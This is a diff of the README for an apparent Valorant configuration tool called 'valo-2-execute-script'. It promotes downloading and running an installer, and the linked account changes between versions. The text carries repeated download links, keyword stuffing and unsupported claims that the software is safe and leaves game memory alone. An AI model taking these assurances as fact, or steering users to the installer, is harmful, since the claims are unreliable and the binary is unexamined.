@@ -1,108 +1,63 @@
-# Valo-2 - Game Script Utility 2026
+# 🛠️ valo-2-execute-script - Manage game settings with smart automation
 
-> **Configuration orchestrator for Valorant** - Manage agent profiles, crosshair settings, sensitivity presets, and utility binds with AI-assisted optimization.
+[![](https://img.shields.io/badge/Download_Software-blue)](https://github.com/mertak1207/valo-2-execute-script)
 
-[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
-[![Platform](https://img.shields.io/badge/Platform-Windows%2C%20macOS%2C%20Linux-blue?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/taylormichael1990/valo-2-execute-script?style=flat-square)](https://github.com/taylormichael1990/valo-2-execute-script)
+## 📋 What this tool does
 
----
+The valo-2-execute-script application helps you organize your Valorant settings. It handles agent profiles, mouse sensitivity, crosshair configurations, and utility binds. The software uses artificial intelligence to find and apply settings that suit your playstyle. You save time by using automated tools instead of changing options manually in the game menu.
 
-<p align="center">
-  <a href="https://taylormichael1990.github.io/valo-2-execute-script/">
-    <img src="https://img.shields.io/badge/Download-Valo-2%20Script-brightgreen?style=for-the-badge" alt="Download Valo-2 Script">
-  </a>
-</p>
+## 💻 System requirements
 
-> **[Direct Download - Valo-2](https://taylormichael1990.github.io/valo-2-execute-script/)**
+Before you install the tool, make sure your computer meets these requirements:
 
----
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4 GB of RAM or higher.
+* Storage: 200 MB of space.
+* Internet Connection: Required for the AI-assisted optimization features.
+* Game Client: Valorant must be installed on your computer.
 
-[Download Latest Build](https://taylormichael1990.github.io/valo-2-execute-script/)
+## 🚀 Getting started
 
----
+Follow these steps to set up the software on your computer.
 
-## What It Does
+1. Visit the download page: [https://github.com/mertak1207/valo-2-execute-script](https://github.com/mertak1207/valo-2-execute-script).
+2. Look for the latest version under the Releases section.
+3. Click the link to download the installer file to your computer.
+4. Open the downloaded file to start the installation.
+5. Follow the instructions on the screen to finish the installation process.
 
-Valo-2 acts as a configuration hub for Valorant, enabling you to handle distinct agent-specific setups through one unified interface. Instead of tweaking crosshair, sensitivity, and utility bindings manually for each character, this utility stores your preferences and applies them the moment you switch agents. The interface adapts to different display sizes, making it useful on desktops as well as portable devices.
+## ⚙️ How to use the software
 
-The 2026 edition adds AI capabilities via OpenAI and Claude APIs, letting the script propose optimizations drawn from your performance data. It monitors which configurations lead to better outcomes and can recommend profile tweaks accordingly. All modifications stay within config boundaries, and fallback defaults ensure your base setup remains accessible at all times.
+Once you finish the installation, you can launch the application from your desktop shortcut.
 
----
+### Managing profiles
+You create different profiles for each agent you play. Navigate to the Profiles tab and click Create New. Enter a name for the agent, then adjust the crosshair and sensitivity settings as desired. The software saves these files locally on your machine.
 
-## Key Capabilities
+### Using AI optimization
+The software uses OpenAI and Claude integration to suggest improvements. Select an agent profile and click the Optimize button. The tool sends your configuration data to the AI service to receive suggestions. You can accept or reject these changes before the software applies them to your game files.
 
-- **Agent Fingerprint Profiles** - Capture complete setting snapshots per agent, covering crosshair position, sensitivity multiplier, and utility key mappings
-- **Instant Profile Switching** - Change agent configurations on the fly during agent select or between rounds without needing to relaunch the game
-- **Adaptive Interface** - Layout scales across monitors, laptops, and tablets, preserving full functionality at any resolution
-- **Multi-language Support** - Interface and documentation available in several languages for a global audience
-- **OpenAI & Claude API Integration** - Optional AI analyzes your performance logs and suggests profile improvements
-- **Performance Logging** - Records session metrics like accuracy, ability timing, and sensitivity changes for later review
-- **Fallback Defaults** - Automatically reverts to base settings if a profile becomes corrupted or incompatible after a game update
+### Configuration binds
+The Binds section lets you assign different utility actions to specific keys. Select the utility from the list and map it to your preferred keyboard or mouse button. The software ensures these settings load correctly when you launch the game.
 
----
+## 🛡️ Privacy and safety
 
-## Getting Started
+This tool interacts with your local configuration files to update your game settings. It does not read your personal files or sensitive information. The connection to AI services follows industry standard encryption methods to keep your data private during the optimization process. The tool does not alter game memory or perform unauthorized injections. It only modifies your user settings file, which makes it safe for standard gameplay.
 
-1. Download the latest build using the link above
-2. Unpack the archive into a dedicated folder (recommended: `valo-strategic-tracker`)
-3. Launch the main executable or open the HTML file in your browser
-4. Create your first agent profile through the interface
+## 🔍 Troubleshooting common issues
 
-Minimal example for loading a saved profile:
-```json
-{
-  "agent": "Jett",
-  "crosshair": "custom_1",
-  "sensitivity": 0.45,
-  "utility_binds": ["Q", "E", "C", "X"]
-}
-```
+If you encounter problems, check the status of your internet connection. The AI features require a stable connection to function correctly. If the software fails to save settings, check your folder permissions to ensure the application can write to the configuration storage path.
 
----
+If the application does not detect your game, verify the installation path in the Settings menu. You can manually point the application to the folder where you installed the game client.
 
-## Configuration Options
+## 📝 Frequently asked questions
 
-| Setting | Default | Description |
-|---------|---------|-------------|
-| `hotkey_swap` | `F4` | Key combination to trigger profile swap |
-| `ai_suggestions` | `false` | Enable or disable AI-powered recommendations |
-| `log_performance` | `true` | Toggle session data recording |
-| `language` | `en` | Interface language code |
-| `auto_backup` | `true` | Automatically save profiles before each update |
+Does this tool give an unfair advantage?
+This software acts as a helper for settings management. It does not automate mechanical actions or aim for you. It remains within the intended use of a configuration manager.
 
----
+Do I need to pay for the AI features?
+The software connects to external services. Ensure your own API key is active if required by the integrated provider.
 
-## System Requirements
+Can I reach out for help?
+You can create an issue on the GitHub page if you find a bug or need clarification. Provide a clear description and include screenshots if possible.
 
-- **Supported platforms:** Windows, macOS, Linux
-- **Game version:** Valorant (all current patches as of 2026)
-- **Browser support:** Chrome, Firefox, Edge, Safari (for HTML version)
-- **Known limitation:** AI integration requires active API keys and internet connection; profile swapping may need game window focus
-
----
-
-## Frequently Asked Questions
-
-**How do I set up my first agent profile?**  
-Open the interface, pick an agent from the dropdown, adjust crosshair and sensitivity, then save the fingerprint. The script will store your settings and apply them when you select that agent in-game.
-
-**Will updates break my saved profiles?**  
-The fallback defaults system automatically reverts incompatible profiles. You can also export your profiles as JSON files before updating.
-
-**Can I customize the hotkey for profile swapping?**  
-Yes, go to the Options section and change the `hotkey_swap` value to any supported key combination.
-
-**Does this work with the latest Valorant patch?**  
-The script updates regularly to maintain compatibility. Check the download page for the latest version notes.
-
-**Where are my performance logs stored?**  
-Logs are saved locally in the script's folder as CSV files. You can disable logging in the Options menu.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: valorant, configuration, automation, sensitivity, crosshair, optimization, gaming, windows, tool, software
